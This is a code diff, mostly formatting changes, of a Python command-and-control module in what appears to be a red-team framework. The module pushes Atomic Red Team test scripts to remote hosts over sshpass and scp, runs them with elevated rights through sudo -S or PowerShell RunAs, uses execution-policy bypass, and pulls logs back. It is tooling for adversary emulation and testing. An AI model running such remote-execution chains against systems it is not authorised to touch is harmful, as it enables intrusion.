-            ssh_args = ["sshpass", "-e", "ssh", f"{username}@{self.params['rhost']}", "powershell.exe", "-Command", f"Start-Process powershell.exe -ArgumentList '-File', '{win_atomic_path}/atomic_agent.ps1' -Verb RunAs"]
+            scp_args = [
+                "sshpass",
+                "-e",
+                "scp",
+                "-r",
+                f"{tmp_path}/",
+                f"{username}@{self.params['rhost']}:{win_drop_path}/",
+            ]
+            ssh_args = [
+                "sshpass",
+                "-e",
+                "ssh",
+                f"{username}@{self.params['rhost']}",
+                "powershell.exe",
+                "-Command",
+                f"Start-Process powershell.exe -ArgumentList '-File', '{win_atomic_path}/atomic_agent.ps1' -Verb RunAs",
+            ]
 
         subprocess.run(scp_args, shell=False, env=_env, check=False)
         exit_code = subprocess.run(ssh_args, shell=False, env=_env, check=False).returncode
@@ -1907,11 +1960,39 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
         else:
             input("    [!] Press enter to clean Red Operation: ")
         if extension == ".sh":
-            clean_scp_args = ["sshpass", "-e", "scp", "-r", f"{tmp_path}/", f"{username}@{self.params['rhost']}:/tmp/lazyown_atomic_test"]
-            clean_ssh_args = ["sshpass", "-e", "ssh", f"{username}@{self.params['rhost']}", f"cd /tmp/lazyown_atomic_test/ && chmod +x /tmp/lazyown_atomic_test/* && echo \"{sudo_pass}\" | sudo -S /tmp/lazyown_atomic_test/atomic_clean_agent.sh"]
+            clean_scp_args = [
+                "sshpass",
+                "-e",
+                "scp",
+                "-r",
+                f"{tmp_path}/",
+                f"{username}@{self.params['rhost']}:/tmp/lazyown_atomic_test",
+            ]
+            clean_ssh_args = [
+                "sshpass",
+                "-e",
+                "ssh",
+                f"{username}@{self.params['rhost']}",
+                f'cd /tmp/lazyown_atomic_test/ && chmod +x /tmp/lazyown_atomic_test/* && echo "{sudo_pass}" | sudo -S /tmp/lazyown_atomic_test/atomic_clean_agent.sh',
+            ]
         else:
-            clean_scp_args = ["sshpass", "-e", "scp", "-r", f"{tmp_path}/", f"{username}@{self.params['rhost']}:{win_drop_path}/"]
-            clean_ssh_args = ["sshpass", "-e", "ssh", f"{username}@{self.params['rhost']}", "powershell.exe", "-Command", f"Start-Process powershell.exe -ArgumentList '-File', '{win_atomic_path}/atomic_clean_agent.ps1' -Verb RunAs"]
+            clean_scp_args = [
+                "sshpass",
+                "-e",
+                "scp",
+                "-r",
+                f"{tmp_path}/",
+                f"{username}@{self.params['rhost']}:{win_drop_path}/",
+            ]
+            clean_ssh_args = [
+                "sshpass",
+                "-e",
+                "ssh",
+                f"{username}@{self.params['rhost']}",
+                "powershell.exe",
+                "-Command",
+                f"Start-Process powershell.exe -ArgumentList '-File', '{win_atomic_path}/atomic_clean_agent.ps1' -Verb RunAs",
+            ]
 
         subprocess.run(clean_scp_args, shell=False, env=_env, check=False)
         exit_code = subprocess.run(clean_ssh_args, shell=False, env=_env, check=False).returncode
@@ -1919,9 +2000,21 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
         # Transfer logs back to C2
         log_path = f"{tmp_path}/*.log"
         if extension == ".sh":
-            log_scp_args = ["sshpass", "-e", "scp", f"{username}@{self.params['rhost']}:{log_path}", f"{sessions_path}/"]
+            log_scp_args = [
+                "sshpass",
+                "-e",
+                "scp",
+                f"{username}@{self.params['rhost']}:{log_path}",
+                f"{sessions_path}/",
+            ]
         else:
-            log_scp_args = ["sshpass", "-e", "scp", f"{username}@{self.params['rhost']}:{win_atomic_path}/*.log", f"{sessions_path}/"]
+            log_scp_args = [
+                "sshpass",
+                "-e",
+                "scp",
+                f"{username}@{self.params['rhost']}:{win_atomic_path}/*.log",
+                f"{sessions_path}/",
+            ]
         subprocess.run(log_scp_args, shell=False, env=_env, check=False)
 
         if exit_code == 0:
@@ -2021,13 +2114,14 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
         for i, step in enumerate(steps):
             atomic_id = step.get("atomic_id")
             if not atomic_id:
-                print_warn(f"Step {i+1} missing atomic_id.")
+                print_warn(f"Step {i + 1} missing atomic_id.")
                 continue
-            print_msg(f"Generating step {i+1}: {atomic_id}")
+            print_msg(f"Generating step {i + 1}: {atomic_id}")
             self.do_atomic_gen(f"{atomic_id}{gen_args}")
             if auto_mode:
                 os.path.join(os.getcwd(), "sessions", f"atomic_test_{atomic_id}*")
                 import fnmatch
+
                 matches = []
                 for root, _, files in os.walk(os.path.join(os.getcwd(), "sessions")):
                     for f in files:
@@ -2036,7 +2130,11 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                 if matches:
                     latest = max(matches, key=os.path.getmtime)
                     print_msg(f"[auto] Executing {latest}...")
-                    run_command(f"bash {latest}" if latest.endswith(".sh") else f"powershell -ExecutionPolicy Bypass -File {latest}")
+                    run_command(
+                        f"bash {latest}"
+                        if latest.endswith(".sh")
+                        else f"powershell -ExecutionPolicy Bypass -File {latest}"
+                    )
                 else:
                     print_warn(f"[auto] No generated script found for {atomic_id}")
 
@@ -2067,21 +2165,12 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
         clean_scripts = [p for p in run_cleans if p.endswith(extension)]
 
         if extension == ".sh":
-            agent_lines = [
-                "#!/bin/bash",
-                "mkdir -p /tmp/lazyown_logs"
-            ]
-            agent_lines += [
-                f"/bin/bash {os.path.join(tmp_path, os.path.basename(script))}" for script in test_scripts
-            ]
+            agent_lines = ["#!/bin/bash", "mkdir -p /tmp/lazyown_logs"]
+            agent_lines += [f"/bin/bash {os.path.join(tmp_path, os.path.basename(script))}" for script in test_scripts]
             agent_lines.append("tar czf /tmp/lazyown_logs.tar.gz /tmp/lazyown_logs")
 
-            clean_lines = [
-                "#!/bin/bash"
-            ]
-            clean_lines += [
-                f"/bin/bash {os.path.join(tmp_path, os.path.basename(script))}" for script in clean_scripts
-            ]
+            clean_lines = ["#!/bin/bash"]
+            clean_lines += [f"/bin/bash {os.path.join(tmp_path, os.path.basename(script))}" for script in clean_scripts]
         else:
             win_drop = str(self.params.get("backdoor_win_service_path", "") or "").replace("/", "\\").rstrip("\\")
             if not win_drop:
@@ -2089,12 +2178,16 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                 return
             win_agent_path = f"{win_drop}\\lazyown_atomic_test"
             agent_lines = [
-                f"Start-Process powershell.exe -ArgumentList '-File', '{win_agent_path}/{os.path.basename(script)}' -Verb RunAs" for script in test_scripts
+                f"Start-Process powershell.exe -ArgumentList '-File', '{win_agent_path}/{os.path.basename(script)}' -Verb RunAs"
+                for script in test_scripts
             ]
-            agent_lines.append("Compress-Archive -Path C:\\ProgramData\\lazyown_logs\\* -DestinationPath C:\\ProgramData\\lazyown_logs.zip")
+            agent_lines.append(
+                "Compress-Archive -Path C:\\ProgramData\\lazyown_logs\\* -DestinationPath C:\\ProgramData\\lazyown_logs.zip"
+            )
 
             clean_lines = [
-                f"Start-Process powershell.exe -ArgumentList '-File', '{win_agent_path}/{os.path.basename(script)}' -Verb RunAs" for script in clean_scripts
+                f"Start-Process powershell.exe -ArgumentList '-File', '{win_agent_path}/{os.path.basename(script)}' -Verb RunAs"
+                for script in clean_scripts
             ]
 
         with open(os.path.join(tmp_path, f"apt_agent{extension}"), "w") as f:
@@ -2333,10 +2426,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             for output_line in render_result(result):
                 print_msg(output_line)
             if not result.ok and not args.dry_run:
-                print_warn(
-                    "[apt_chain] retry hint: retry chain "
-                    f"{chain_name} --var key=value --sudo"
-                )
+                print_warn(f"[apt_chain] retry hint: retry chain {chain_name} --var key=value --sudo")
                 print_warn(
                     "[apt_chain] --sudo authorizes elevated reruns (root-level effects); it prompts with the destructive-steps warning"
                 )
@@ -2538,9 +2628,9 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             print_msg(f"  Phases: {result['phases']}")
             print_msg(f"  Atomic tests found: {result['atomic_tests_found']}")
             print_msg(f"  Atomic tests missing: {result['atomic_tests_missing']}")
-            if result['missing']:
+            if result["missing"]:
                 print_warn("Missing tests (clone/update Atomic Red Team):")
-                for m in result['missing']:
+                for m in result["missing"]:
                     print_warn(f"    - {m['atomic_id']} ({m['name']})")
 
         elif action == "run":
@@ -2588,10 +2678,9 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             mitre_test technique <id>   # Shows details of a specific technique
         """
         try:
-
             mitre_repo = "https://github.com/mitre-attack/attack-stix-data.git"
             mitre_path = os.path.join("external", ".exploit", "mitre")
-            enterprise_attack_path = os.path.join(mitre_path,"enterprise-attack", "enterprise-attack-16.1.json")
+            enterprise_attack_path = os.path.join(mitre_path, "enterprise-attack", "enterprise-attack-16.1.json")
 
             if not os.path.exists(mitre_path):
                 print_warn("MITRE ATT&CK repository not found. Cloning...")
@@ -2634,17 +2723,23 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                     return
                 tactic_name = " ".join(args[1:])
                 tactic = next(
-                    (t for t in attack_store.query([Filter("type", "=", "x-mitre-tactic")]) if t["name"].lower() == tactic_name.lower()),
-                    None
+                    (
+                        t
+                        for t in attack_store.query([Filter("type", "=", "x-mitre-tactic")])
+                        if t["name"].lower() == tactic_name.lower()
+                    ),
+                    None,
                 )
                 if not tactic:
                     print_warn(f"Tactic '{tactic_name}' not found.")
                     return
 
-                techniques = attack_store.query([
-                    Filter("type", "=", "attack-pattern"),
-                    Filter("kill_chain_phases.phase_name", "=", tactic["x_mitre_shortname"])
-                ])
+                techniques = attack_store.query(
+                    [
+                        Filter("type", "=", "attack-pattern"),
+                        Filter("kill_chain_phases.phase_name", "=", tactic["x_mitre_shortname"]),
+                    ]
+                )
                 print_msg(f"Techniques for tactic '{tactic_name}':")
                 for technique in techniques:
                     print_msg(f"- {technique['name']} (ID: {technique['id']})")
@@ -2656,7 +2751,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                 technique_id = args[1]
                 technique = next(
                     (t for t in attack_store.query([Filter("type", "=", "attack-pattern")]) if technique_id in t["id"]),
-                    None
+                    None,
                 )
                 if not technique:
                     print_warn(f"Technique '{technique_id}' not found.")
@@ -2757,11 +2852,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             os.makedirs(playbook_dir)
 
         # Define the playbook structure
-        playbook = {
-            "apt_name": playbook_name,
-            "description": f"Playbook generated for {playbook_name}",
-            "steps": []
-        }
+        playbook = {"apt_name": playbook_name, "description": f"Playbook generated for {playbook_name}", "steps": []}
 
         # Load Atomic Red Team tests
         yaml_files = glob.glob(os.path.join(atomic_yaml_path, "**", "*.yaml"), recursive=True)
@@ -2781,7 +2872,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                             "cleanup_command": test.get("executor", {}).get("cleanup_command", ""),
                             "input_arguments": test.get("input_arguments", {}),
                             "mitre_id": data.get("attack_technique", "No MITRE ID available"),
-                            "references": test.get("references", [])
+                            "references": test.get("references", []),
                         }
 
         # Debug: Print the number of tests loaded
@@ -2790,7 +2881,10 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
         # Filter tests based on command-line arguments
         filtered_tests = {}
         for test_id, test in tests.items():
-            if all(filter_term.lower() in test["name"].lower() or filter_term.lower() in test["description"].lower() for filter_term in filters):
+            if all(
+                filter_term.lower() in test["name"].lower() or filter_term.lower() in test["description"].lower()
+                for filter_term in filters
+            ):
                 filtered_tests[test_id] = test
 
         # Debug: Print the number of filtered tests
@@ -2798,10 +2892,12 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
 
         # Add filtered tests to the playbook with MITRE ATT&CK information
         for test_id, test in filtered_tests.items():
-            mitre_technique = attack_store.query([
-                Filter("type", "=", "attack-pattern"),
-                Filter("external_references.external_id", "=", test["mitre_id"])
-            ])
+            mitre_technique = attack_store.query(
+                [
+                    Filter("type", "=", "attack-pattern"),
+                    Filter("external_references.external_id", "=", test["mitre_id"]),
+                ]
+            )
 
             if mitre_technique:
                 mitre_technique = mitre_technique[0]
@@ -2815,7 +2911,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                     "mitre_examples": mitre_technique.get("x_mitre_examples", []),
                     "mitre_references": [ref.get("url") for ref in mitre_technique.get("external_references", [])],
                     "mitre_related_techniques": mitre_technique.get("x_mitre_related_techniques", []),
-                    "mitre_mitigations": mitre_technique.get("x_mitre_mitigations", [])
+                    "mitre_mitigations": mitre_technique.get("x_mitre_mitigations", []),
                 }
             else:
                 mitre_info = {
@@ -2828,22 +2924,24 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                     "mitre_examples": [],
                     "mitre_references": [],
                     "mitre_related_techniques": [],
-                    "mitre_mitigations": []
+                    "mitre_mitigations": [],
                 }
 
-            playbook["steps"].append({
-                "atomic_id": test_id,
-                "name": test["name"],
-                "description": test["description"],
-                "platforms": test["platforms"],
-                "command": test["command"],
-                "prereq_command": test["prereq_command"],
-                "get_prereq_command": test["get_prereq_command"],
-                "cleanup_command": test["cleanup_command"],
-                "input_arguments": test["input_arguments"],
-                "references": test["references"],
-                "mitre_info": mitre_info
-            })
+            playbook["steps"].append(
+                {
+                    "atomic_id": test_id,
+                    "name": test["name"],
+                    "description": test["description"],
+                    "platforms": test["platforms"],
+                    "command": test["command"],
+                    "prereq_command": test["prereq_command"],
+                    "get_prereq_command": test["get_prereq_command"],
+                    "cleanup_command": test["cleanup_command"],
+                    "input_arguments": test["input_arguments"],
+                    "references": test["references"],
+                    "mitre_info": mitre_info,
+                }
+            )
 
         # Save the playbook to a YAML file
         playbook_file = os.path.join(playbook_dir, f"{playbook_name}.yaml")
@@ -2884,7 +2982,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
         playbook = {
             "apt_name": playbook_name,
             "description": f"Custom playbook generated for {playbook_name}",
-            "steps": []
+            "steps": [],
         }
 
         for tech in techniques:
@@ -2896,7 +2994,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                     "command": tech.get("command", ""),
                     "description": tech.get("description", "No description available"),
                     "prereq_command": tech.get("prereq_command", ""),
-                    "cleanup_command": tech.get("cleanup_command", "")
+                    "cleanup_command": tech.get("cleanup_command", ""),
                 }
                 playbook["steps"].append(step)
 
@@ -2936,7 +3034,9 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                 print_msg("Caldera is not installed. Installing...")
                 self.cmd(f"git clone {caldera_repo} --recursive {caldera_path}")
 
-            self.cmd(f"cd {caldera_path} && python3 -m venv env && source env/bin/activate && pip3 install -r requirements.txt")
+            self.cmd(
+                f"cd {caldera_path} && python3 -m venv env && source env/bin/activate && pip3 install -r requirements.txt"
+            )
 
             golang_installed = self.cmd("go version") == 0
             if not golang_installed:
@@ -2996,9 +3096,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                 "name": ability.get("name", "Unnamed"),
                 "description": ability.get("description", ""),
                 "platforms": list(ability.get("platforms", {}).keys()),
-                "command": "\n".join(
-                    e.get("command", "") for e in ability.get("executors", [])
-                ),
+                "command": "\n".join(e.get("command", "") for e in ability.get("executors", [])),
                 "cleanup_command": "",
                 "mitre_info": {
                     "mitre_id": ability.get("technique_id", "TXXXX"),
@@ -3116,11 +3214,13 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
             }
 
             for test in phase.get("atomic_tests", []):
-                ability["executors"].append({
-                    "name": "sh" if "linux" in data.get("platforms", []) else "psh",
-                    "command": f"# Atomic test {test.get('atomic_id', '')}\n# {test.get('name', '')}",
-                    "cleanup": "",
-                })
+                ability["executors"].append(
+                    {
+                        "name": "sh" if "linux" in data.get("platforms", []) else "psh",
+                        "command": f"# Atomic test {test.get('atomic_id', '')}\n# {test.get('name', '')}",
+                        "cleanup": "",
+                    }
+                )
 
             out_file = os.path.join(tactic_dir, f"{ability['id']}.yml")
             with open(out_file, "w") as f:
